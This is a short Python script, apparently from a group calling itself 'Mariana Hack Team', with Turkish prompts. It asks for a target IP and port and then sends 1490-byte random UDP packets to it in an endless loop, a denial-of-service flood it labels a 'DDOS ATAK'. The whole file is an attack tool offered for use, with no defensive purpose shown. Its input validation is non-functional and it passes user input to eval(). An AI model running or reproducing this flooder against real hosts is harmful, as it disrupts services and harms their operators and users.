
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

validate = URLValidator()

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
#Banner :
print("MARİANA")
#Type your ip and port number (find IP address using nslookup or any online website) 
ip = input(" [+] IP ADRESİ GİR YİĞİDİM : ")
port = eval(input(" [+] PORT : "))
os.system("clear")
	
try:
	validate = ip
	print(" KONTROL EDİLİYOR.... ")
	print(" [+] MARİANA GURURLA SUNAR ....")
except ValidationError as exception :
	print(" ✘ Input a right url")

#Lets start our attack
print(" ")
print("   BAŞLIOOO ")
print(" " )
print(" [+] MARİANA is attacking server " + ip )
print (" " )
time.sleep(5)
sent = 0
try :
 while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		print("\n [+] Gönder Paketleri gönderr %s packet to %s Port:%s"%(sent,ip,port))
		if port == 65534:
			port = 1
except KeyboardInterrupt:
	print(" ")
	print("\n [-] Ctrl+C Detected.........Exiting")
	print(" [-] DDOS ATAK STOPPED BEYBİ")
input(" Enter To Exit")
os.system("clear")
print(" [-] Mariana Hack Team...")
